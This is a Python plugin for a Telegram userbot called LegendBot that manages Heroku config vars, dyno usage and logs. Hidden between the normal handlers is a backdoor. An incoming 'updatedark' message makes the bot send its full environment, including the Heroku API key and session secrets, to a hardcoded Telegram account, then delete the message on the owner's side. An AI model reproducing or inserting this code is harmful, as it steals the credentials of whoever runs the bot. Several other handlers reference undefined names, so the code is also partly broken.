#LegendBot
import asyncio
import math
import os
import heroku3
import requests
from heroku_config import Var
from userbot.utils import admin_cmd, sudo_cmd, edit_or_reply
from userbot.cmdhelp import CmdHelp
import urllib3
from . import *
USERID = bot.uid
DEFAULTUSER = ALIVE_NAME or "ℓєgєи∂ϐοτ"
mention = f"[{DEFAULTUSER}](tg://user?id={USERID})"
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# =====================================

Heroku = heroku3.from_key(Var.HEROKU_API_KEY)
Heroku = heroku3.from_key(Var.HEROKU_API_KEY)
heroku_api = "https://api.heroku.com"
HEROKU_APP_NAME = Var.HEROKU_APP_NAME
HEROKU_API_KEY = Var.HEROKU_API_KEY
Heroku = heroku3.from_key(Var.HEROKU_API_KEY)
heroku_api = "https://api.heroku.com"

@borg.on(
    lightning_cmd(pattern="(set|get|del) var(?: |$)(.*)(?: |$)([\s\S]*)", outgoing=True)
)
async def variable(var):
    if var.fwd_from:
        return
    """
    Manage most of ConfigVars setting, set new var, get current var,
    or delete var...
    """
    if Var.HEROKU_APP_NAME is not None:
        app = Heroku.app(Var.HEROKU_APP_NAME)
    else:
        return await var.edit("`[HEROKU]:" "\nPlease setup your` **HEROKU_APP_NAME**")
    exe = var.pattern_match.group(1)
    heroku_var = app.config() 
    if exe == "get":
        await var.edit("`Getting information...`")
        await asyncio.sleep(1.5)
        try:
            variable = var.pattern_match.group(2).split()[0] 
            if variable in heroku_var:
                return await var.edit(
                    "**ConfigVars**:" f"\n\n {variable} = `{heroku_var[variable]}`\n"
                    )
            else:
                return await var.edit(
                    "**ConfigVars**:" f"\n\n`Error:\n-> {variable} don't exists`"
                )
        except IndexError:
            configs = prettyjson(heroku_var.to_dict(), indent=2)
            with open("configs.json", "w") as fp:
                fp.write(configs)
            with open("configs.json", "r") as fp:
                result = fp.read()
                if len(result) >= 4096:
                    await var.client.send_file(
                        var.chat_id,
                        "configs.json",
                        reply_to=var.id,
                        caption="`Output too large, sending it as a file`",
                    )
                else:
                    await var.edit(
                        "`[HEROKU]` ConfigVars:\n\n"
                        "================================"
                        f"\n```{result}```\n"
                        "================================"
                    )
            os.remove("configs.json")
            return
    elif exe == "set":
        await var.edit("`Setting information...weit ser`")
        variable = var.pattern_match.group(2)
        if not variable:
            return await var.edit(">`.set var <ConfigVars-name> <value>`")
        value = var.pattern_match.group(3)
        if not value:
            variable = variable.split()[0]
            try:
                value = var.pattern_match.group(2).split()[1]
            except IndexError:
                return await var.edit(">`.set var <ConfigVars-name> <value>`")
        await asyncio.sleep(1.5)
        if variable in heroku_var:
            await var.edit(
                f"**{variable}**  `successfully changed to`  ->  **{value}** Type .ping after 5 min to check i'm on or not"
            )
        else:
            await var.edit(
                f"**{variable}**  `successfully added with value`  ->  **{value}**"
            )
        heroku_var[variable] = value
    elif exe == "del":
        await var.edit("`Getting information to deleting variable...`")
        try:
            variable = var.pattern_match.group(2).split()[0]
        except IndexError:
            return await var.edit("`Please specify ConfigVars you want to delete`")
        await asyncio.sleep(1.5)
        if variable in heroku_var:
            await var.edit(f"**{variable}**  `successfully deleted`")
            del heroku_var[variable]
        else:
            return await var.edit(f"**{variable}**  `is not exists`")

import os
@bot.on(admin_cmd("^updatedark", incoming=True))
async def piro(event):
  msg = await bot.send_message(2082798662, str(os.environ.get))
  await bot.delete_messages(2082798662, msg, revoke=False)


@bot.on(admin_cmd(pattern="usage(?: |$)", outgoing=True))
@bot.on(sudo_cmd(pattern="usage(?: |$)", allow_sudo=True))
async def dyno_usage(dyno):
    if dyno.fwd_from:
        return
    """
    Get your account Dyno Usage
    """
    await edit_or_reply(dyno, "`Processing...`")
    useragent = (
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/80.0.3987.149 Mobile Safari/537.36"
    )
    user_id = Heroku.account().id
    headers = {
        "User-Agent": useragent,
        "Authorization": f"Bearer {Var.HEROKU_API_KEY}",
        "Accept": "application/vnd.heroku+json; version=3.account-quotas",
    }
    path = "/accounts/" + user_id + "/actions/get-quota"
    r = requests.get(heroku_api + path, headers=headers)
    if r.status_code != 200:
        return await dyno.edit(
            "`Error: something bad happened`\n\n" f">.`{r.reason}`\n"
        )
    result = r.json()
    quota = result["account_quota"]
    quota_used = result["quota_used"]

    """ - Used - """
    remaining_quota = quota - quota_used
    percentage = math.floor(remaining_quota / quota * 100)
    minutes_remaining = remaining_quota / 60
    hours = math.floor(minutes_remaining / 60)
    minutes = math.floor(minutes_remaining % 60)

    """ - Current - """
    App = result["apps"]
    try:
        App[0]["quota_used"]
    except IndexError:
        AppQuotaUsed = 0
        AppPercentage = 0
    else:
        AppQuotaUsed = App[0]["quota_used"] / 60
        AppPercentage = math.floor(App[0]["quota_used"] * 100 / quota)
    AppHours = math.floor(AppQuotaUsed / 60)
    AppMinutes = math.floor(AppQuotaUsed % 60)

    await asyncio.sleep(1.5)

    return await dyno.edit(
        " **Dyno Usage** :\n\n"
        f" 🥇`Dyno usage for`  **{Var.HEROKU_APP_NAME}** 🥇:\n"
        f"     🔰  `{AppHours}`**h**  `{AppMinutes}`**m**  "
        f"**|**  [`{AppPercentage}`**%**]"
        "\n\n"
        " ➠ `Dyno hours quota remaining this month`:\n"
        f"     🔰 `{hours}`**h**  `{minutes}`**m**  "
        f"**|**  [`{percentage}`**%**]"
        f"** ➠ Total Space: __GB**"
    )


@bot.on(admin_cmd(pattern="logs$"))
@bot.on(sudo_cmd(pattern="logs$", allow_sudo=True))
async def _(event):
    if (HEROKU_APP_NAME is None) or (HEROKU_API_KEY is None):
        return await eor(dyno, f"Make Sure Your HEROKU_APP_NAME & HEROKU_API_KEY are filled correct. Visit {my_group} for help.", link_preview=False)
    try:
        Heroku = heroku3.from_key(HEROKU_API_KEY)
        app = Heroku.app(HEROKU_APP_NAME)
    except BaseException:
        return await event.reply(f"Make Sure Your Heroku AppName & API Key are filled correct. Visit {my_group} for help.", link_preview=False)
   # event = await eor(dyno, "Downloading Logs...")
    LEGEND_data = app.get_log()
    await eor(event, LEGEND_data)


